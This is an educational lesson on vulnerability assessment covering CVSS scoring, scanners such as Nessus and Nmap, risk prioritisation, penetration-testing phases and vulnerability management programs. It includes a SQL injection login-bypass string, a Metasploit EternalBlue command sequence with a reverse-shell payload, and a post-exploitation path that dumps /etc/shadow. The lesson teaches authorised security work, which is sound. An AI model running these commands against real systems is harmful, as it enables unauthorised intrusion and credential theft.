---
id: vulnerability-assessment
title: Vulnerability Assessment
chapterId: ch4-network-security
order: 41
duration: 85
objectives:
  - Conduct vulnerability scans
  - Perform penetration testing
  - Analyze vulnerability reports
  - Prioritize remediation efforts
  - Implement vulnerability management programs
---

# Lesson 41: Vulnerability Assessment

## Introduction

Vulnerability assessment is the systematic process of identifying, quantifying, and prioritizing security weaknesses in systems, networks, and applications. Unlike penetration testing which exploits vulnerabilities, vulnerability assessment focuses on discovery and risk evaluation to guide remediation efforts.

In this lesson, we'll explore vulnerability scanning tools, assessment methodologies, CVSS scoring, penetration testing, security assessments, and vulnerability management programs.

**Key Principle:** You cannot protect what you cannot see - continuous vulnerability assessment is essential for security.

## Vulnerability Assessment Fundamentals

### What is a Vulnerability?

**Definition:**
```
Vulnerability: Weakness that can be exploited to compromise security

Types:
1. Software Vulnerabilities:
   - Buffer overflow
   - SQL injection
   - Cross-site scripting (XSS)
   - Unpatched software

2. Configuration Vulnerabilities:
   - Default credentials
   - Unnecessary services
   - Weak encryption
   - Improper permissions

3. Design Vulnerabilities:
   - Architectural flaws
   - Insufficient authentication
   - Lack of encryption

4. Human Vulnerabilities:
   - Social engineering susceptibility
   - Weak passwords
   - Poor security awareness
```

**Vulnerability vs Exploit:**
```
Vulnerability: The weakness
Exploit: Code/technique that takes advantage of vulnerability

Example:
Vulnerability: MS17-010 (EternalBlue) - SMB protocol flaw
Exploit: WannaCry ransomware exploited MS17-010

Vulnerability: SQL Injection in login form
Exploit: ' OR '1'='1 -- (bypass authentication)

Not all vulnerabilities have public exploits
But all exploits target specific vulnerabilities
```

### CVE and CVSS

**CVE (Common Vulnerabilities and Exposures):**
```
Purpose: Standardized naming for vulnerabilities
Format: CVE-YEAR-NUMBER

Examples:
CVE-2017-0144: MS17-010 (EternalBlue)
CVE-2014-0160: Heartbleed (OpenSSL)
CVE-2017-5754: Meltdown (CPU vulnerability)

Components:
- CVE ID: Unique identifier
- Description: What is the vulnerability
- References: Links to more information
- CVSS Score: Severity rating

Database: https://cve.mitre.org
```

**CVSS (Common Vulnerability Scoring System):**
```
Purpose: Standardized severity scoring
Range: 0.0 - 10.0
Version: CVSS v3.1 (current)

Severity Ratings:
- None: 0.0
- Low: 0.1 - 3.9
- Medium: 4.0 - 6.9
- High: 7.0 - 8.9
- Critical: 9.0 - 10.0
```

**CVSS Metrics:**
```
Base Score (intrinsic qualities):
1. Attack Vector (AV):
   - Network (N): Remotely exploitable
   - Adjacent (A): Adjacent network
   - Local (L): Local access required
   - Physical (P): Physical access required

2. Attack Complexity (AC):
   - Low (L): Simple to exploit
   - High (H): Complex, specific conditions

3. Privileges Required (PR):
   - None (N): Unauthenticated
   - Low (L): Basic user
   - High (H): Admin/privileged

4. User Interaction (UI):
   - None (N): Automatic
   - Required (R): User must do something

5. Scope (S):
   - Unchanged (U): Only vulnerable component
   - Changed (C): Impacts beyond vulnerable component

6. Impact (CIA):
   - Confidentiality Impact (C)
   - Integrity Impact (I)
   - Availability Impact (A)
   - Each rated: None (N), Low (L), High (H)

Example: CVE-2017-0144 (EternalBlue)
CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 8.1 (High)

Translation:
- Attack Vector: Network (remotely exploitable)
- Attack Complexity: High (specific conditions)
- Privileges Required: None (unauthenticated)
- User Interaction: None (automatic)
- Scope: Unchanged
- Impact: High confidentiality, integrity, availability

Result: High severity, should be patched immediately
```

**Temporal and Environmental Scores:**
```
Temporal (changes over time):
- Exploit Code Maturity
- Remediation Level
- Report Confidence

Environmental (organization-specific):
- Confidentiality Requirement
- Integrity Requirement
- Availability Requirement
- Modified Base Metrics

Use: Adjust priority based on your environment
Example: Database server = high confidentiality requirement
         Test server = low confidentiality requirement
         Same vulnerability, different priority
```

## Vulnerability Scanning

### Scanning Types

**Network Vulnerability Scan:**
```
Target: Network infrastructure and services
Checks:
- Open ports
- Service versions
- Known vulnerabilities
- Configuration issues
- Missing patches

Example Findings:
- Port 445 open (SMB)
- SMBv1 enabled (vulnerable to EternalBlue)
- SSL 2.0 enabled (deprecated)
- Default SNMP community strings
```

**Web Application Scan:**
```
Target: Web applications
Checks:
- SQL injection
- Cross-site scripting (XSS)
- Cross-site request forgery (CSRF)
- Authentication bypass
- Session management issues
- Information disclosure

Example Findings:
- SQL injection in login form
- Missing X-Frame-Options header
- Weak password policy
- Unvalidated redirects
```

**Authenticated vs Unauthenticated:**
```
Unauthenticated (External):
- Attacker's perspective
- No credentials provided
- Sees only publicly accessible
- Fewer vulnerabilities found

Authenticated (Internal):
- Credentialed scan
- Uses service accounts
- Deeper inspection
- More vulnerabilities found
- Finds missing patches

Recommendation: Both types for comprehensive assessment
- Unauthenticated: External attack surface
- Authenticated: Internal posture, compliance
```

### Scanning Tools

**Nessus:**
```
Type: Commercial (Tenable)
Strengths:
- Comprehensive plugin library (150,000+)
- Easy to use
- Compliance auditing (PCI, HIPAA)
- Authenticated scanning

Use Cases:
- Enterprise vulnerability management
- Compliance scanning
- Configuration auditing

Pricing: Per-scanner licensing

Example Scan:
1. Create new scan (Basic Network Scan)
2. Define target: 10.1.1.0/24
3. Configure credentials (Windows, Linux, network devices)
4. Schedule: Weekly, Sunday 2:00 AM
5. Launch scan
6. Review results (Critical, High, Medium, Low, Info)
7. Export report (PDF, CSV, HTML)
```

**OpenVAS (GreenBone):**
```
Type: Open-source
Strengths:
- Free
- Comprehensive (100,000+ tests)
- Active community
- Web-based interface

Disadvantages:
- Complex installation
- Less polished than commercial
- Slower updates

Use: Budget-conscious organizations, learning

Installation (Kali Linux):
apt install openvas
gvm-setup
gvm-start

Access: https://localhost:9392
```

**Qualys:**
```
Type: Cloud-based SaaS
Strengths:
- No hardware/software to install
- Scalable (cloud agents)
- Continuous monitoring
- Asset inventory

Use: Large enterprises, cloud environments

Features:
- VMDR (Vulnerability Management, Detection & Response)
- Policy Compliance
- Web Application Scanning
- Container Security
```

**Rapid7 Nexpose/InsightVM:**
```
Type: Commercial
Strengths:
- Real-time risk scoring
- Integration with Metasploit
- Adaptive security
- Live dashboards

Use: Security-focused organizations
```

**Nmap:**
```
Type: Open-source, command-line
Purpose: Network discovery and port scanning
Strengths:
- Fast
- Flexible (NSE scripts)
- Standard tool

Basic Scan:
nmap -sV 10.1.1.100

Vulnerability Scan:
nmap --script vuln 10.1.1.100

Service Detection:
nmap -sV -p 1-65535 10.1.1.0/24

OS Detection:
nmap -O 10.1.1.100

Aggressive Scan:
nmap -A 10.1.1.100
```

### Scan Configuration

**Scan Policies:**
```
Network Discovery:
- Ping sweep
- Port scan
- Service detection
- No vulnerability checks
- Use: Inventory, fast discovery

Basic Network Scan:
- Common ports
- Common vulnerabilities
- Fast scan
- Use: Regular scanning

Advanced Scan:
- All ports
- All plugins
- Authenticated
- Slow but thorough
- Use: In-depth assessment

Compliance Scan:
- PCI-DSS compliance
- HIPAA compliance
- CIS benchmarks
- Use: Regulatory requirements
```

**Scanning Best Practices:**
```
1. Get Authorization:
   - Written approval required
   - Define scope
   - Define schedule
   - Coordinate with IT ops

2. Schedule Appropriately:
   - Off-hours for production
   - Low-impact first (test)
   - Gradual rollout

3. Use Credentials:
   - Service accounts (read-only)
   - Strong passwords
   - Document account usage
   - Rotate credentials

4. Segment Scans:
   - Don't scan everything at once
   - Critical systems separate
   - Control scan intensity

5. Avoid Disruption:
   - Test on dev environment first
   - Some plugins can crash services
   - Monitor during scan
   - Have rollback plan
```

## Vulnerability Analysis

### Risk Assessment

**Risk Formula:**
```
Risk = Likelihood × Impact

Factors:
- Vulnerability Severity (CVSS score)
- Asset Value (how critical?)
- Threat Likelihood (is it being exploited?)
- Existing Controls (what mitigations exist?)

Example:
Vulnerability: SQL injection in public website
CVSS: 9.0 (Critical)
Asset: Customer database (High value)
Threat: OWASP Top 10, actively exploited
Controls: None (direct Internet exposure)
Risk: Critical - Patch immediately

Vulnerability: Missing patch on isolated test server
CVSS: 7.5 (High)
Asset: Test server (Low value)
Threat: Not externally accessible
Controls: Network segmentation
Risk: Medium - Patch during next maintenance window
```

**Prioritization:**
```
Priority 1 (Immediate - 24 hours):
- Critical vulnerabilities in Internet-facing systems
- Known exploits in the wild
- Systems with sensitive data
- Easily exploitable

Priority 2 (High - 1 week):
- High vulnerabilities in Internet-facing
- Critical vulnerabilities in internal systems
- Known exploit exists

Priority 3 (Medium - 1 month):
- Medium vulnerabilities
- High vulnerabilities in low-value systems
- Require complex exploit

Priority 4 (Low - Next maintenance):
- Low vulnerabilities
- Systems with compensating controls
- Limited impact
```

### False Positives

**Identifying False Positives:**
```
Common Causes:
1. Banner Detection:
   - Scanner reads version banner
   - Assumes vulnerability exists
   - Reality: Already patched, banner not updated

2. Generic Signatures:
   - Broad detection rules
   - Not specific to configuration

3. Environmental Differences:
   - Scanner assumes default config
   - Reality: Non-standard configuration

Example:
Scanner Report: "Apache 2.4.10 vulnerable to CVE-2014-0226"
Reality: Apache compiled without affected module
Result: False positive

Verification:
- Manual testing
- Check actual configuration
- Review patch level
- Exploit verification (controlled environment)
```

**Reducing False Positives:**
```
1. Use Authenticated Scans:
   - Verify actual patch level
   - Check configuration

2. Tune Scanner:
   - Disable irrelevant plugins
   - Adjust detection thresholds

3. Regular Updates:
   - Keep scanner updated
   - Update plugins

4. Manual Verification:
   - Sample validation
   - High-priority findings

5. Document False Positives:
   - Track known false positives
   - Exclude from future scans
   - Share with team
```

## Penetration Testing

### Pen Test vs Vulnerability Scan

**Differences:**
```
Feature          Vulnerability Scan    Penetration Test
Purpose          Find vulnerabilities  Exploit vulnerabilities
Approach         Automated            Manual + Automated
Depth            Surface-level        Deep exploitation
Goal             Identify issues      Prove impact
Frequency        Weekly/Monthly       Annually/Semi-annually
Disruption       Minimal              Potential
Cost             Low                  High
Scope            Broad                Focused

Analogy:
Vulnerability Scan = Home security checklist (unlocked windows, weak locks)
Penetration Test = Hire a burglar to actually try to break in
```

### Penetration Testing Types

**Black Box:**
```
Knowledge: Zero knowledge of target
Approach: External attacker perspective
Information: Only public information

Process:
1. Reconnaissance (OSINT)
2. Scanning and enumeration
3. Vulnerability identification
4. Exploitation
5. Post-exploitation
6. Reporting

Advantages:
- Real-world attack simulation
- Unbiased perspective

Disadvantages:
- Time-consuming
- May miss internal vulnerabilities

Use: External security posture assessment
```

**White Box:**
```
Knowledge: Full knowledge of target
Approach: Insider perspective
Information: Source code, network diagrams, credentials

Process:
1. Review architecture
2. Code review
3. Configuration review
4. Identify vulnerabilities
5. Attempt exploitation
6. Report findings

Advantages:
- Comprehensive
- Efficient (less time on reconnaissance)
- Finds more vulnerabilities

Disadvantages:
- Not realistic attacker scenario
- Time-intensive

Use: In-depth security assessment
```

**Gray Box:**
```
Knowledge: Partial knowledge
Approach: Compromised user perspective
Information: User-level access, some documentation

Balance between black and white box
Most common in practice
```

### Penetration Testing Phases

**1. Reconnaissance:**
```
Passive (OSINT):
- Google dorking
- Social media (LinkedIn, Facebook)
- DNS records (whois, dig)
- Job postings (tech stack)
- Shodan (Internet-connected devices)

Active:
- Port scanning (nmap)
- Service enumeration
- Banner grabbing
- DNS zone transfer
- Email harvesting

Tools:
- Maltego (relationship mapping)
- theHarvester (email/domain enumeration)
- recon-ng (OSINT framework)
- Shodan (Internet scanning)
```

**2. Scanning and Enumeration:**
```
Network Scanning:
nmap -sV -sC -p- 10.1.1.0/24

Service Enumeration:
- SMB: enum4linux, smbclient
- SNMP: snmpwalk
- Web: nikto, dirb, gobuster
- Databases: sqlmap

Vulnerability Scanning:
- Nessus
- OpenVAS
- Nmap vuln scripts
```

**3. Exploitation:**
```
Methods:
- Metasploit Framework
- Custom exploits
- Social engineering
- Password attacks
- Web application attacks

Example (Metasploit):
msfconsole
search eternal blue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.1.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.1.1.50
exploit

Cautions:
- Production systems at risk
- Data loss possible
- Services may crash
- Legal authorization required
```

**4. Post-Exploitation:**
```
Objectives:
- Maintain access (persistence)
- Privilege escalation
- Lateral movement
- Data exfiltration (simulated)
- Cover tracks

Activities:
- Dump credentials
- Access sensitive files
- Pivot to other systems
- Document access level

Example:
1. Initial access: Web server (www-data user)
2. Privilege escalation: Kernel exploit → root
3. Credential dump: /etc/shadow
4. Lateral movement: SSH to database server
5. Data access: Customer database
6. Document: Full database access achieved
```

**5. Reporting:**
```
Report Sections:
1. Executive Summary:
   - High-level findings
   - Business impact
   - Risk summary
   - Recommendations

2. Methodology:
   - Scope
   - Approach
   - Tools used
   - Limitations

3. Findings:
   - Vulnerability description
   - CVSS score
   - Steps to reproduce
   - Proof of concept
   - Screenshots
   - Remediation recommendations

4. Technical Details:
   - Exploitation path
   - Commands used
   - Network diagrams

5. Appendices:
   - Tool output
   - Log files
   - Complete vulnerability list

Deliverables:
- Executive presentation
- Detailed technical report
- Remediation roadmap
```

### Rules of Engagement

**Define Before Testing:**
```
Scope:
- IP ranges included
- IP ranges excluded (third-party, out-of-scope)
- Systems included (web apps, network, wireless)
- Time window (business hours, after hours)

Constraints:
- No social engineering of executives
- No physical security testing
- No DoS attacks
- No data exfiltration (or simulated only)

Communication:
- Primary contact
- Escalation contacts
- Emergency stop procedure
- Reporting schedule

Legal:
- Written authorization (signed contract)
- NDA (non-disclosure agreement)
- Get-out-of-jail-free letter (if law enforcement involved)
```

## Security Assessments

### Compliance Audits

**PCI-DSS:**
```
Purpose: Protect credit card data
Requirement: Annual ASV (Approved Scanning Vendor) scan

Scope:
- All systems in cardholder data environment (CDE)
- Any system connected to CDE

Requirements:
- Quarterly external vulnerability scans
- Pass with no high/critical vulnerabilities
- ASV-certified scanner required

Common Findings:
- SSL/TLS vulnerabilities
- Missing patches
- Unnecessary services
- Weak ciphers
```

**HIPAA:**
```
Purpose: Protect health information
Requirement: Regular risk assessments

Security Rule:
- Technical safeguards
- Administrative safeguards
- Physical safeguards

Assessments:
- Vulnerability scanning
- Penetration testing (recommended)
- Risk analysis
- Security controls review
```

### Configuration Audits

**CIS Benchmarks:**
```
Purpose: Secure configuration guidelines
Coverage: 100+ technologies (Windows, Linux, network devices)

Benchmark Levels:
- Level 1: Basic security, minimal impact
- Level 2: High security, some functionality impact

Example (Windows Server 2022):
- Password policy
- Account lockout
- Audit policy
- User rights assignment
- Security options
- Event log settings
- Firewall configuration

Tools:
- CIS-CAT (Configuration Assessment Tool)
- Nessus (policy compliance)
- Lynis (Linux auditing)
```

## Vulnerability Management Program

### Program Components

**Continuous Scanning:**
```
Schedule:
- Weekly: Internal network scan
- Monthly: External perimeter scan
- Quarterly: Full authenticated scan
- Annually: Penetration test

Automation:
- Scheduled scans
- Automatic reporting
- Alert on new critical findings
```

**Remediation Process:**
```
1. Vulnerability Identified:
   - Scan detects vulnerability
   - Assigned CVSS score
   - Prioritized based on risk

2. Ticket Creation:
   - Automatic ticket in IT system
   - Assigned to responsible team
   - SLA based on severity

3. Remediation:
   - Patch, reconfigure, or mitigate
   - Document action taken
   - Follow change management process

4. Verification:
   - Rescan to verify fix
   - Close ticket if resolved
   - If not resolved, escalate

5. Reporting:
   - Monthly metrics
   - Trend analysis
   - Executive dashboard
```

**Metrics:**
```
Key Performance Indicators (KPIs):
- Mean Time to Remediate (MTTR)
  * Critical: <7 days
  * High: <30 days
  * Medium: <90 days

- Vulnerability Count by Severity
  * Track over time
  * Goal: Decreasing trend

- Patch Compliance
  * % systems fully patched
  * Goal: >95%

- Scan Coverage
  * % assets scanned regularly
  * Goal: 100%

- False Positive Rate
  * Goal: <5%
```

## Review Questions

1. **What is the difference between a vulnerability and an exploit?**
   - Vulnerability is the weakness, exploit is the code/technique that takes advantage of it

2. **What does CVE stand for?**
   - Common Vulnerabilities and Exposures (standardized naming)

3. **What CVSS score range is considered Critical?**
   - 9.0 - 10.0

4. **What is the difference between authenticated and unauthenticated scans?**
   - Authenticated provides credentials for deeper inspection, unauthenticated is external perspective

5. **What is a false positive in vulnerability scanning?**
   - Scanner reports vulnerability that doesn't actually exist or is already mitigated

6. **What is the difference between vulnerability scanning and penetration testing?**
   - Scanning finds vulnerabilities (automated), pen testing exploits them (manual, proves impact)

7. **What are the three types of penetration tests?**
   - Black box (no knowledge), white box (full knowledge), gray box (partial knowledge)

8. **What should be defined in rules of engagement?**
   - Scope, constraints, communication, legal authorization, time window

9. **What is MTTR?**
   - Mean Time to Remediate (how long to fix vulnerabilities)

10. **What compliance standard requires quarterly vulnerability scans?**
    - PCI-DSS (Payment Card Industry Data Security Standard)

## Key Takeaways

- **Vulnerability assessment is continuous process** - not one-time activity
- **CVSS provides standardized severity scoring** - helps prioritize remediation
- **Both automated and manual testing needed** - scanning + pen testing
- **Authenticated scans find more vulnerabilities** - but both types important
- **Prioritize by risk, not just CVSS** - consider asset value and threat landscape
- **False positives require verification** - don't waste time on non-issues
- **Penetration testing proves real-world impact** - goes beyond vulnerability discovery
- **Define clear rules of engagement** - scope, authorization, constraints
- **Vulnerability management requires process** - scan, prioritize, remediate, verify
- **Metrics drive improvement** - track MTTR, vulnerability counts, patch compliance

## Next Steps

In the final lesson of this chapter, we'll explore **Incident Response**, including incident handling procedures, forensics, and lessons learned.

---

**Lesson Complete!** You now understand vulnerability assessment techniques and tools that identify security weaknesses before attackers do.
